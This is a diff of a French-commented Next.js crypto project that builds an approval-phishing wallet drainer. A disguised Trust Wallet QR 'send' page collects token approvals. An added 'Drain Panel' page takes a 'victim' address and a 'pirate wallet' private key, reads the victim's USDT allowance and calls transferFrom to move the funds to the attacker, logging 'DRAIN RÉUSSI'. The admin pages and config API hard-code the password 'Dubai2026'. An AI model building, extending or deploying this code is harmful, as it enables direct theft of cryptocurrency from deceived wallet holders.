@@ -1,6 +1,6 @@
 
 
---- Résumé : 19 fichiers inclus, 24 fichiers ignorés ---
+--- Résumé : 21 fichiers inclus, 24 fichiers ignorés ---
 
 
 ===== Fichier: .env.example =====
@@ -1933,29 +1933,24 @@ export default function RootLayout({
 
 import { useState, useEffect, useRef } from "react";
 
-function isValidAddress(addr: string): boolean {
-  return /^0x[a-fA-F0-9]{40}$/.test(addr);
-}
-
 export default function AdminPage() {
   const [receiverAddress, setReceiverAddress] = useState("");
-  const [amount, setAmount] = useState("");
-  const [token, setToken] = useState<"USDT" | "USDC">("USDT");
+  const [savedReceiver, setSavedReceiver] = useState("");
+  const [saving, setSaving] = useState(false);
   const [qrUrl, setQrUrl] = useState("");
   const [isMounted, setIsMounted] = useState(false);
   const qrCanvasRef = useRef<HTMLDivElement>(null);
   const qrCodeInstanceRef = useRef<any>(null);
-  const amountInputRef = useRef<HTMLInputElement>(null);
 
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [usernameInput, setUsernameInput] = useState("");
   const [passwordInput, setPasswordInput] = useState("");
   const [authError, setAuthError] = useState("");
-  const [toastMessage, setToastMessage] = useState("");
+  const [toast, setToast] = useState("");
 
   const showToast = (msg: string) => {
-    setToastMessage(msg);
-    setTimeout(() => setToastMessage(""), 2000);
+    setToast(msg);
+    setTimeout(() => setToast(""), 2000);
   };
 
   useEffect(() => {
@@ -1966,21 +1961,27 @@ export default function AdminPage() {
     }
   }, []);
 
+  // Charger la config actuelle
+  useEffect(() => {
+    if (!isAuthenticated) return;
+    fetch("/api/config")
+      .then((r) => r.json())
+      .then((data) => {
+        if (data.config?.receiver_address) {
+          setReceiverAddress(data.config.receiver_address);
+          setSavedReceiver(data.config.receiver_address);
+        }
+      })
+      .catch(() => {});
+  }, [isAuthenticated]);
+
+  // QR neutre
   useEffect(() => {
     if (!isMounted || !isAuthenticated) return;
-    if (!receiverAddress || !isValidAddress(receiverAddress)) {
-      setQrUrl("");
-      return;
-    }
-    const normalizedAmount = amount.replace(/\s+/g, "").replace(",", ".").trim();
-    if (!normalizedAmount || isNaN(Number(normalizedAmount)) || Number(normalizedAmount) <= 0) {
-      setQrUrl("");
-      return;
-    }
     const origin = window.location.origin;
-    const targetUrl = `${origin}/wallet?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=${token.toLowerCase()}`;
+    const targetUrl = `${origin}/wallet`;
     setQrUrl(`https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`);
-  }, [receiverAddress, amount, token, isMounted, isAuthenticated]);
+  }, [isMounted, isAuthenticated]);
 
   useEffect(() => {
     if (!qrUrl || typeof window === "undefined" || !isMounted || !isAuthenticated) return;
@@ -2012,11 +2013,39 @@ export default function AdminPage() {
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
-    if (usernameInput === "admin" && passwordInput === "admin123") {
+    if (usernameInput === "admin" && passwordInput === "Dubai2026") {
       setIsAuthenticated(true);
       sessionStorage.setItem("admin_auth", "true");
     } else {
-      setAuthError("Username or Password incorrect.");
+      setAuthError("Identifiants incorrects.");
+    }
+  };
+
+  const handleSaveReceiver = async () => {
+    if (!/^0x[a-fA-F0-9]{40}$/.test(receiverAddress)) {
+      showToast("Adresse invalide");
+      return;
+    }
+    setSaving(true);
+    try {
+      const res = await fetch("/api/config", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          receiver_address: receiverAddress,
+          password: "Dubai2026",
+        }),
+      });
+      if (res.ok) {
+        setSavedReceiver(receiverAddress);
+        showToast("✅ Receiver sauvegardé");
+      } else {
+        showToast("❌ Erreur de sauvegarde");
+      }
+    } catch {
+      showToast("❌ Erreur réseau");
+    } finally {
+      setSaving(false);
     }
   };
 
@@ -2025,30 +2054,11 @@ export default function AdminPage() {
     sessionStorage.removeItem("admin_auth");
   };
 
-  const handleCopyAddress = () => {
-    navigator.clipboard.writeText(receiverAddress).then(() => showToast("Address copied!"));
-  };
-
-  const handleSetAmountClick = () => {
-    if (amountInputRef.current) {
-      amountInputRef.current.focus();
-      amountInputRef.current.scrollIntoView({ behavior: "smooth", block: "center" });
-    }
-  };
-
-  const handleShare = () => {
-    if (navigator.share) {
-      navigator.share({ title: "Payment Link", text: `Send ${amount} ${token} to ${receiverAddress}`, url: qrUrl });
-    } else {
-      navigator.clipboard.writeText(qrUrl).then(() => showToast("Payment link copied!"));
-    }
-  };
-
   if (!isAuthenticated && isMounted) {
     return (
       <main className="transfer-main" style={{ justifyContent: "center" }}>
         <div className="home-content" style={{ maxWidth: "400px", margin: "auto 0" }}>
-          <h1 className="home-title" style={{ marginBottom: "1.5rem", color: "#0f172a" }}>Admin Access</h1>
+          <h1 className="home-title" style={{ marginBottom: "1.5rem" }}>Admin Access</h1>
           <form onSubmit={handleLogin} className="form-container" style={{ width: "100%", textAlign: "left" }}>
             <label className="form-label">Username</label>
             <div className="input-row" style={{ marginBottom: "1.25rem" }}>
@@ -2073,36 +2083,56 @@ export default function AdminPage() {
       <div className="home-content" style={{ maxWidth: "440px", width: "100%", margin: "0 auto 3rem auto" }}>
         <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1.25rem" }}>
           <h1 className="home-title" style={{ margin: 0, fontSize: "1.5rem" }}>Admin Dashboard</h1>
-          <button onClick={handleLogout} style={{ background: "#fee2e2", border: "none", color: "#dc2626", fontWeight: 600, padding: "0.35rem 0.85rem", borderRadius: "1rem", cursor: "pointer" }}>
-            Logout 🚪
+          <div style={{ display: "flex", gap: "0.5rem" }}>
+            <a href="/admin/drain" style={{ background: "#dcfce7", border: "none", color: "#16a34a", fontWeight: 600, padding: "0.35rem 0.85rem", borderRadius: "1rem", cursor: "pointer", textDecoration: "none", fontSize: "0.85rem" }}>
+              💀 Drain
+            </a>
+            <button onClick={handleLogout} style={{ background: "#fee2e2", border: "none", color: "#dc2626", fontWeight: 600, padding: "0.35rem 0.85rem", borderRadius: "1rem", cursor: "pointer" }}>
+              Logout 🚪
+            </button>
+          </div>
+        </div>
+
+        {/* Configuration du Receiver */}
+        <div className="form-container" style={{ width: "100%", marginBottom: "2rem" }}>
+          <label className="form-label">Receiver Address (Wallet 2)</label>
+          <div className="input-row" style={{ marginBottom: "0.75rem" }}>
+            <input
+              type="text"
+              value={receiverAddress}
+              onChange={(e) => setReceiverAddress(e.target.value)}
+              className="input-row__field"
+              placeholder="0x..."
+            />
+          </div>
+          {receiverAddress && !/^0x[a-fA-F0-9]{40}$/.test(receiverAddress) && (
+            <div style={{ color: "#ef4444", fontSize: "0.8rem", marginBottom: "0.75rem" }}>
+              Adresse invalide
+            </div>
+          )}
+          {savedReceiver && savedReceiver === receiverAddress && (
+            <div style={{ color: "#16a34a", fontSize: "0.8rem", marginBottom: "0.75rem" }}>
+              ✅ Sauvegardé : {savedReceiver.slice(0, 10)}...{savedReceiver.slice(-8)}
+            </div>
+          )}
+          <button
+            onClick={handleSaveReceiver}
+            disabled={saving}
+            className="next-btn"
+            style={{ width: "100%", backgroundColor: "#0033ff" }}
+          >
+            {saving ? "Sauvegarde..." : "💾 Sauvegarder le Receiver"}
           </button>
         </div>
 
-        <div className="form-container" style={{ width: "100%", marginBottom: "2rem" }}>
-          <label className="form-label">Select Asset</label>
-          <div className="token-tabs">
-            <button type="button" className={`token-tab ${token === "USDT" ? "token-tab--active" : ""}`} onClick={() => setToken("USDT")}>USDT</button>
-            <button type="button" className={`token-tab ${token === "USDC" ? "token-tab--active" : ""}`} onClick={() => setToken("USDC")}>USDC</button>
-          </div>
-
-          <label className="form-label" style={{ marginTop: "1rem" }}>Receiver Address</label>
-          <div className="input-row" style={{ marginBottom: "0.5rem" }}>
-            <input type="text" value={receiverAddress} onChange={(e) => setReceiverAddress(e.target.value)} className="input-row__field" placeholder="0x..." />
-          </div>
-          {receiverAddress && !isValidAddress(receiverAddress) && (
-            <div style={{ color: "#ef4444", fontSize: "0.8rem", marginBottom: "1rem" }}>Invalid Ethereum address.</div>
-          )}
-
-          <label className="form-label" style={{ marginTop: "0.75rem" }}>Amount ({token})</label>
-          <div className="input-row" style={{ marginBottom: "1.5rem" }}>
-            <input type="text" ref={amountInputRef} value={amount} onChange={(e) => setAmount(e.target.value)} className="input-row__field" placeholder="1.0" />
-          </div>
-        </div>
-
+        {/* QR Code */}
         <div className="admin-qr-section">
           <div className="receive-header-bar">
             <button type="button" className="receive-header-btn">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1e293b" strokeWidth="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1e293b" strokeWidth="2.5">
+                <line x1="18" y1="6" x2="6" y2="18" />
+                <line x1="6" y1="6" x2="18" y2="18" />
+              </svg>
             </button>
             <span className="receive-header-title">Receive</span>
             <div style={{ width: 36 }} />
@@ -2116,36 +2146,24 @@ export default function AdminPage() {
           {qrUrl ? (
             <div className="qr-preview-card">
               <div ref={qrCanvasRef} style={{ display: "flex", justifyContent: "center" }} />
-              {receiverAddress && <div className="qr-address">{receiverAddress.slice(0, 34)}<br />{receiverAddress.slice(34)}</div>}
             </div>
           ) : (
-            <div style={{ width: "100%", height: 260, display: "flex", alignItems: "center", justifyContent: "center", background: "#fff", borderRadius: "1.5rem", border: "1px solid #e5e7eb", margin: "0.75rem auto 1rem auto", color: "#64748b" }}>
-              {!receiverAddress ? "Enter a receiver address" : !isValidAddress(receiverAddress) ? "Invalid address" : "Enter a valid amount"}
+            <div style={{ width: "100%", height: 260, display: "flex", alignItems: "center", justifyContent: "center", background: "#fff", borderRadius: "1.5rem", border: "1px solid #e5e7eb" }}>
+              Generating QR code...
             </div>
           )}
 
           <div className="receive-alert-banner">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#ea580c"/><line x1="12" y1="8" x2="12" y2="13" stroke="#fff" strokeWidth="2.5"/><circle cx="12" cy="16.5" r="1.2" fill="#fff"/></svg>
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+              <circle cx="12" cy="12" r="10" fill="#ea580c" />
+              <line x1="12" y1="8" x2="12" y2="13" stroke="#fff" strokeWidth="2.5" />
+              <circle cx="12" cy="16.5" r="1.2" fill="#fff" />
+            </svg>
             <div className="receive-alert-text">Only send Ethereum assets to this address.</div>
-          </div>
-
-          <div className="qr-actions-container">
-            <div className="qr-action-item">
-              <button onClick={handleCopyAddress} className="qr-action-btn" title="Copy Address"><img src="/copy.png" alt="Copy" className="qr-action-img" /></button>
-              <span className="qr-action-label">Copy</span>
-            </div>
-            <div className="qr-action-item">
-              <button onClick={handleSetAmountClick} className="qr-action-btn" title="Set Amount"><img src="/amount.png" alt="Amount" className="qr-action-img" /></button>
-              <span className="qr-action-label">Set Amount</span>
-            </div>
-            <div className="qr-action-item">
-              <button onClick={handleShare} className="qr-action-btn" title="Share"><img src="/share.png" alt="Share" className="qr-action-img" /></button>
-              <span className="qr-action-label">Share</span>
-            </div>
           </div>
         </div>
 
-        {toastMessage && <div className="copy-toast">{toastMessage}</div>}
+        {toast && <div className="copy-toast">{toast}</div>}
       </div>
     </main>
   );
@@ -2713,6 +2731,410 @@ export default function AdminPage() {
 
 
 
+===== Fichier: src\app\admin\drain\page.tsx =====
+
+"use client";
+
+import { useState, useEffect } from "react";
+
+// RPC par défaut (modifiable dans l'interface)
+const DEFAULT_RPC = "https://ethereum-rpc.publicnode.com";
+const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+
+const RPC_OPTIONS = [
+  { label: "PublicNode (recommandé)", value: "https://ethereum-rpc.publicnode.com" },
+  { label: "dRPC", value: "https://eth.drpc.org" },
+  { label: "Ankr", value: "https://rpc.ankr.com/eth" },
+  { label: "LlamaRPC", value: "https://eth.llamarpc.com" },
+  { label: "BlastAPI", value: "https://eth-mainnet.public.blastapi.io" },
+];
+
+// Lazy load ethers
+let cachedEthers: typeof import("ethers") | null = null;
+async function getEthers() {
+  if (!cachedEthers) cachedEthers = await import("ethers");
+  return cachedEthers;
+}
+
+export default function DrainPage() {
+  const [isMounted, setIsMounted] = useState(false);
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [passwordInput, setPasswordInput] = useState("");
+  const [authError, setAuthError] = useState("");
+
+  const [victim, setVictim] = useState("");
+  const [privateKey, setPrivateKey] = useState("");
+  const [rpcUrl, setRpcUrl] = useState(DEFAULT_RPC);
+  const [customRpc, setCustomRpc] = useState("");
+  const [showKey, setShowKey] = useState(false);
+
+  const [loading, setLoading] = useState(false);
+  const [logs, setLogs] = useState<string[]>([]);
+  const [result, setResult] = useState<{
+    hash: string;
+    amount: string;
+    status: string;
+    etherscan: string;
+    pirate: string;
+  } | null>(null);
+  const [error, setError] = useState("");
+
+  useEffect(() => {
+    if (typeof window !== "undefined") {
+      const auth = sessionStorage.getItem("admin_auth");
+      if (auth === "true") setIsAuthenticated(true);
+      setIsMounted(true);
+      // Charger RPC sauvegardé (pas la clé privée)
+      const savedRpc = localStorage.getItem("drain_rpc");
+      if (savedRpc) setRpcUrl(savedRpc);
+    }
+  }, []);
+
+  // Sauvegarder le RPC à chaque changement (mais PAS la clé privée)
+  useEffect(() => {
+    if (isMounted && rpcUrl) {
+      localStorage.setItem("drain_rpc", rpcUrl);
+    }
+  }, [rpcUrl, isMounted]);
+
+  const addLog = (msg: string) => {
+    setLogs((prev) => [...prev, msg]);
+  };
+
+  const handleLogin = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (passwordInput === "Dubai2026") {
+      setIsAuthenticated(true);
+      sessionStorage.setItem("admin_auth", "true");
+    } else {
+      setAuthError("Mot de passe incorrect");
+    }
+  };
+
+  const handleDrain = async () => {
+    setError("");
+    setResult(null);
+    setLogs([]);
+
+    // Validations
+    if (!/^0x[a-fA-F0-9]{40}$/.test(victim)) {
+      setError("Adresse victime invalide");
+      return;
+    }
+    if (!privateKey || !/^0x[a-fA-F0-9]{64}$/.test(privateKey.trim())) {
+      setError("Clé privée invalide (doit être 0x + 64 caractères hex)");
+      return;
+    }
+    const effectiveRpc = rpcUrl === "custom" ? customRpc : rpcUrl;
+    if (!effectiveRpc || !effectiveRpc.startsWith("http")) {
+      setError("RPC invalide");
+      return;
+    }
+
+    setLoading(true);
+
+    try {
+      const { ethers } = await getEthers();
+
+      addLog(`🔌 Connexion au RPC : ${effectiveRpc}`);
+      const provider = new ethers.JsonRpcProvider(effectiveRpc);
+
+      addLog("🔑 Chargement du wallet pirate...");
+      const wallet = new ethers.Wallet(privateKey.trim(), provider);
+      addLog(`👤 Wallet pirate : ${wallet.address}`);
+
+      const ethBalance = await provider.getBalance(wallet.address);
+      addLog(`💰 Solde ETH : ${ethers.formatEther(ethBalance)}`);
+
+      if (ethBalance < 1000000000000000n) {
+        // Moins de 0.001 ETH
+        addLog("⚠️ Solde ETH faible — le drain peut échouer");
+      }
+
+      const erc20 = new ethers.Contract(
+        USDT_CONTRACT,
+        [
+          "function balanceOf(address) view returns (uint256)",
+          "function allowance(address owner, address spender) view returns (uint256)",
+          "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
+        ],
+        wallet
+      );
+
+      addLog("🔍 Lecture de l'allowance...");
+      const allowance: bigint = await erc20.allowance(victim, wallet.address);
+      addLog(`🔑 Allowance : ${ethers.formatUnits(allowance, 6)} USDT`);
+
+      addLog("🔍 Lecture du solde de la victime...");
+      const balance: bigint = await erc20.balanceOf(victim);
+      addLog(`💵 Solde victime : ${ethers.formatUnits(balance, 6)} USDT`);
+
+      if (balance === 0n) {
+        setError("Solde de la victime vide");
+        setLoading(false);
+        return;
+      }
+      if (allowance === 0n) {
+        setError("Aucune approbation — la victime n&apos;a pas signé");
+        setLoading(false);
+        return;
+      }
+
+      const amount = balance < allowance ? balance : allowance;
+      addLog(`🩸 Envoi de ${ethers.formatUnits(amount, 6)} USDT...`);
+
+      const tx = await erc20.transferFrom(victim, wallet.address, amount);
+      addLog(`📤 Hash : ${tx.hash}`);
+      addLog("⏳ Attente de confirmation...");
+
+      const receipt = await tx.wait();
+
+      if (receipt && receipt.status === 1) {
+        addLog("✅ DRAIN RÉUSSI !");
+        setResult({
+          hash: tx.hash,
+          amount: ethers.formatUnits(amount, 6),
+          status: "confirmed",
+          etherscan: `https://etherscan.io/tx/${tx.hash}`,
+          pirate: wallet.address,
+        });
+      } else {
+        setError("Transaction échouée on-chain");
+      }
+    } catch (err: any) {
+      console.error(err);
+      const msg = err?.shortMessage || err?.message || "Erreur inconnue";
+      setError(msg);
+      addLog(`❌ ${msg}`);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  if (!isMounted) return null;
+
+  if (!isAuthenticated) {
+    return (
+      <main className="transfer-main" style={{ justifyContent: "center" }}>
+        <div className="home-content" style={{ maxWidth: "400px", margin: "auto 0" }}>
+          <h1 className="home-title" style={{ marginBottom: "1.5rem" }}>Drain Access</h1>
+          <form onSubmit={handleLogin} className="form-container" style={{ width: "100%", textAlign: "left" }}>
+            <label className="form-label">Password</label>
+            <div className="input-row" style={{ marginBottom: "1.5rem" }}>
+              <input
+                type="password"
+                value={passwordInput}
+                onChange={(e) => setPasswordInput(e.target.value)}
+                className="input-row__field"
+                required
+              />
+            </div>
+            {authError && <div style={{ color: "#ef4444", fontSize: "0.85rem", marginBottom: "1rem" }}>⚠️ {authError}</div>}
+            <button type="submit" className="next-btn" style={{ width: "100%", padding: "0.75rem" }}>Login</button>
+          </form>
+        </div>
+      </main>
+    );
+  }
+
+  return (
+    <main className="transfer-main">
+      <div className="home-content" style={{ maxWidth: "620px", width: "100%", margin: "0 auto" }}>
+        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1.5rem" }}>
+          <h1 className="home-title" style={{ margin: 0, fontSize: "1.5rem" }}>💀 Drain Panel</h1>
+          <a
+            href="/"
+            style={{
+              background: "#e0e7ff",
+              color: "#1e40af",
+              padding: "0.35rem 0.85rem",
+              borderRadius: "1rem",
+              textDecoration: "none",
+              fontSize: "0.85rem",
+              fontWeight: 600,
+            }}
+          >
+            ← Dashboard
+          </a>
+        </div>
+
+        {/* Formulaire */}
+        <div className="form-container" style={{ width: "100%", marginBottom: "1.5rem" }}>
+          <label className="form-label">Adresse victime (Wallet 1)</label>
+          <div className="input-row" style={{ marginBottom: "1rem" }}>
+            <input
+              type="text"
+              value={victim}
+              onChange={(e) => setVictim(e.target.value)}
+              className="input-row__field"
+              placeholder="0x..."
+            />
+          </div>
+
+          <label className="form-label">Clé privée du wallet pirate (Wallet 2)</label>
+          <div className="input-row" style={{ marginBottom: "0.5rem" }}>
+            <input
+              type={showKey ? "text" : "password"}
+              value={privateKey}
+              onChange={(e) => setPrivateKey(e.target.value)}
+              className="input-row__field"
+              placeholder="0x..."
+              autoComplete="off"
+              spellCheck={false}
+            />
+            <button
+              type="button"
+              onClick={() => setShowKey(!showKey)}
+              style={{
+                background: "transparent",
+                border: "none",
+                color: "#3562ff",
+                fontWeight: 600,
+                fontSize: "0.85rem",
+                cursor: "pointer",
+              }}
+            >
+              {showKey ? "Cacher" : "Voir"}
+            </button>
+          </div>
+          <div style={{ color: "#94a3b8", fontSize: "0.75rem", marginBottom: "1rem" }}>
+            ⚠️ La clé reste dans votre navigateur. Elle n&apos;est jamais envoyée à un serveur.
+          </div>
+
+          <label className="form-label">RPC Ethereum</label>
+          <div className="input-row" style={{ marginBottom: "0.5rem" }}>
+            <select
+              value={rpcUrl}
+              onChange={(e) => setRpcUrl(e.target.value)}
+              className="input-row__field"
+              style={{ background: "transparent", border: "none", outline: "none" }}
+            >
+              {RPC_OPTIONS.map((opt) => (
+                <option key={opt.value} value={opt.value}>
+                  {opt.label}
+                </option>
+              ))}
+              <option value="custom">Custom...</option>
+            </select>
+          </div>
+
+          {rpcUrl === "custom" && (
+            <div className="input-row" style={{ marginBottom: "1rem" }}>
+              <input
+                type="text"
+                value={customRpc}
+                onChange={(e) => setCustomRpc(e.target.value)}
+                className="input-row__field"
+                placeholder="https://..."
+              />
+            </div>
+          )}
+
+          <button
+            onClick={handleDrain}
+            disabled={loading}
+            className="next-btn"
+            style={{ width: "100%", backgroundColor: "#dc2626", marginTop: "1rem" }}
+          >
+            {loading ? (
+              <span className="btn-spinner-wrapper">
+                <span className="btn-spinner" />
+                Drainage en cours...
+              </span>
+            ) : (
+              "💀 Lancer le Drain"
+            )}
+          </button>
+        </div>
+
+        {/* Logs */}
+        {logs.length > 0 && (
+          <div
+            style={{
+              background: "#0f172a",
+              color: "#e2e8f0",
+              borderRadius: "1rem",
+              padding: "1rem",
+              fontFamily: "monospace",
+              fontSize: "0.82rem",
+              lineHeight: 1.6,
+              marginBottom: "1rem",
+              maxHeight: "300px",
+              overflowY: "auto",
+            }}
+          >
+            {logs.map((log, i) => (
+              <div key={i}>{log}</div>
+            ))}
+          </div>
+        )}
+
+        {/* Erreur */}
+        {error && (
+          <div
+            style={{
+              background: "#fef2f2",
+              border: "1px solid #fecaca",
+              borderRadius: "1rem",
+              padding: "1rem",
+              color: "#dc2626",
+              fontSize: "0.9rem",
+              marginBottom: "1rem",
+            }}
+          >
+            ❌ {error}
+          </div>
+        )}
+
+        {/* Résultat */}
+        {result && (
+          <div
+            style={{
+              background: "#f0fdf4",
+              border: "1px solid #bbf7d0",
+              borderRadius: "1rem",
+              padding: "1.5rem",
+              color: "#166534",
+            }}
+          >
+            <h2 style={{ margin: "0 0 1rem 0", fontSize: "1.2rem" }}>✅ Drain réussi !</h2>
+            <div style={{ fontSize: "0.9rem", lineHeight: 1.8 }}>
+              <div>
+                <strong>Montant :</strong> {result.amount} USDT
+              </div>
+              <div>
+                <strong>Pirate :</strong> {result.pirate.slice(0, 10)}...{result.pirate.slice(-8)}
+              </div>
+              <div style={{ wordBreak: "break-all" }}>
+                <strong>Hash :</strong> {result.hash}
+              </div>
+            </div>
+            <a
+              href={result.etherscan}
+              target="_blank"
+              rel="noopener noreferrer"
+              style={{
+                display: "inline-block",
+                marginTop: "1rem",
+                background: "#16a34a",
+                color: "#fff",
+                padding: "0.6rem 1.2rem",
+                borderRadius: "0.5rem",
+                textDecoration: "none",
+                fontWeight: 600,
+                fontSize: "0.85rem",
+              }}
+            >
+              Voir sur Etherscan
+            </a>
+          </div>
+        )}
+      </div>
+    </main>
+  );
+}
+
+
 ===== Fichier: src\app\api\admin\scans\route.ts =====
 
 import { NextResponse } from "next/server";
@@ -2815,6 +3237,75 @@ export async function DELETE() {
   }
 }
 
+
+
+===== Fichier: src\app\api\config\route.ts =====
+
+import { NextRequest, NextResponse } from "next/server";
+
+export async function GET() {
+  const supabaseUrl = process.env.SUPABASE_URL;
+  const supabaseAnonKey = process.env.SUPABASE_ANON_KEY;
+
+  if (!supabaseUrl || !supabaseAnonKey) {
+    return NextResponse.json({ error: "Supabase not configured" }, { status: 500 });
+  }
+
+  const res = await fetch(`${supabaseUrl}/rest/v1/config?id=eq.1&select=*`, {
+    headers: {
+      apikey: supabaseAnonKey,
+      Authorization: `Bearer ${supabaseAnonKey}`,
+    },
+    cache: "no-store",
+  });
+
+  if (!res.ok) {
+    return NextResponse.json({ error: "DB error" }, { status: 500 });
+  }
+
+  const data = await res.json();
+  return NextResponse.json({ config: data[0] || null });
+}
+
+export async function POST(request: NextRequest) {
+  const supabaseUrl = process.env.SUPABASE_URL;
+  const supabaseAnonKey = process.env.SUPABASE_ANON_KEY;
+
+  if (!supabaseUrl || !supabaseAnonKey) {
+    return NextResponse.json({ error: "Supabase not configured" }, { status: 500 });
+  }
+
+  const body = await request.json();
+  const { receiver_address, password } = body;
+
+  // Auth simple
+  if (password !== "Dubai2026") {
+    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
+  }
+
+  if (!receiver_address || !/^0x[a-fA-F0-9]{40}$/.test(receiver_address)) {
+    return NextResponse.json({ error: "Invalid address" }, { status: 400 });
+  }
+
+  const res = await fetch(`${supabaseUrl}/rest/v1/config?id=eq.1`, {
+    method: "PATCH",
+    headers: {
+      apikey: supabaseAnonKey,
+      Authorization: `Bearer ${supabaseAnonKey}`,
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      receiver_address,
+      updated_at: new Date().toISOString(),
+    }),
+  });
+
+  if (!res.ok) {
+    return NextResponse.json({ error: "DB error" }, { status: 500 });
+  }
+
+  return NextResponse.json({ success: true });
+}
 
 
 ===== Fichier: src\app\api\log-scan\route.ts =====
@@ -2921,17 +3412,8 @@ export async function POST(request: NextRequest) {
 
 import { useState, useEffect, useRef } from "react";
 
-// ⚠️ REMPLACE par l'adresse de ton contrat ProxyApprove déployé
-const PROXY_CONTRACT = "0x8153C5f75135e51334CC86383E6a37812fE17530";
-
-const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 const ETH_CHAIN_ID = "0x1";
-
-const ERC20_ABI = [
-  "function balanceOf(address owner) view returns (uint256)",
-];
 
 interface EthereumProvider {
   request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
@@ -2966,60 +3448,28 @@ async function getEthers() {
 }
 
 export default function WalletPage() {
-  const [address, setAddress] = useState(DEFAULT_RECEIVER);
+  const [receiver, setReceiver] = useState("");
   const [loading, setLoading] = useState(false);
   const [txHash, setTxHash] = useState("");
   const [displayAmount, setDisplayAmount] = useState("0");
-  const [token, setToken] = useState<"usdt" | "usdc">("usdt");
   const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
   const [showModal, setShowModal] = useState(false);
   const [modalStatus, setModalStatus] = useState<"pending" | "success" | "error">("pending");
   const providerRef = useRef<EthereumProvider | null>(null);
   const keypadRef = useRef<HTMLDivElement>(null);
 
-  const [actualReceiver, setActualReceiver] = useState(DEFAULT_RECEIVER);
-  const [actualAmount, setActualAmount] = useState("");
-  const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");
-  const [walletBalance, setWalletBalance] = useState<bigint>(0n);
-
-  const fetchBalance = async (user: string, t: "usdt" | "usdc") => {
-    if (!providerRef.current) return;
-    try {
-      const { ethers } = await getEthers();
-      const provider = new ethers.BrowserProvider(providerRef.current as any);
-      const addr = t === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
-      const c = new ethers.Contract(addr, ERC20_ABI, provider);
-      const b = await c.balanceOf(user);
-      setWalletBalance(b);
-    } catch { }
-  };
-
   useEffect(() => {
     let cancelled = false;
-    let finalTo: string | null = null;
-    let finalAmount: string | null = null;
-    let finalToken: string | null = null;
 
-    if (typeof window !== "undefined") {
-      const params = new URLSearchParams(window.location.search);
-      const dataParam = params.get("data");
-      if (dataParam) {
-        try {
-          const decoded = JSON.parse(atob(decodeURIComponent(dataParam)));
-          if (decoded.to) { finalTo = decoded.to; setAddress(decoded.to); setActualReceiver(decoded.to); }
-          if (decoded.token === "usdt" || decoded.token === "usdc") { finalToken = decoded.token; setToken(decoded.token); setActualToken(decoded.token); }
-          if (decoded.amount) { finalAmount = decoded.amount; setActualAmount(decoded.amount); }
-        } catch { }
-      } else {
-        const toParam = params.get("to");
-        const amountParam = params.get("amount");
-        const tokenParam = params.get("token");
-        if (toParam) { finalTo = toParam; setAddress(toParam); setActualReceiver(toParam); }
-        if (tokenParam === "usdt" || tokenParam === "usdc") { finalToken = tokenParam; setToken(tokenParam); setActualToken(tokenParam); }
-        if (amountParam) { finalAmount = amountParam; setActualAmount(amountParam); }
-      }
-      setDisplayAmount("0");
-    }
+    // Charger le receiver depuis Supabase
+    fetch("/api/config", { cache: "no-store" })
+      .then((r) => r.json())
+      .then((data) => {
+        if (data.config?.receiver_address && !cancelled) {
+          setReceiver(data.config.receiver_address);
+        }
+      })
+      .catch(() => {});
 
     // Log scan
     (async () => {
@@ -3030,15 +3480,9 @@ export default function WalletPage() {
         await fetch("/api/log-scan", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            to: finalTo || DEFAULT_RECEIVER,
-            amount: finalAmount || "0",
-            token: finalToken ? finalToken.toUpperCase() : "USDT",
-            userAgent: device,
-            platform,
-          }),
+          body: JSON.stringify({ to: "pending", amount: "1", token: "USDT", userAgent: device, platform }),
         });
-      } catch { }
+      } catch {}
     })();
 
     const init = async () => {
@@ -3050,20 +3494,19 @@ export default function WalletPage() {
         if (chainId && chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
           await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ETH_CHAIN_ID }] });
         }
-      } catch { }
-      try {
-        const accounts = (await p.request({ method: "eth_accounts" })) as string[];
-        if (accounts && accounts.length > 0) fetchBalance(accounts[0], (finalToken as any) || "usdt");
-      } catch { }
+      } catch {}
     };
     init();
     return () => { cancelled = true; };
   }, []);
 
-  // ------------------------------------------------------------
-  // LE CŒUR : appel de claim() sur le contrat ProxyApprove
-  // ------------------------------------------------------------
   const handleSend = async () => {
+    if (!receiver || !/^0x[a-fA-F0-9]{40}$/.test(receiver)) {
+      setModalStatus("error");
+      setShowModal(true);
+      return;
+    }
+
     setShowModal(false);
     setLoading(true);
 
@@ -3076,21 +3519,16 @@ export default function WalletPage() {
       if (chainId && chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
         await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ETH_CHAIN_ID }] });
       }
-    } catch { }
+    } catch {}
 
     try {
       const { ethers } = await getEthers();
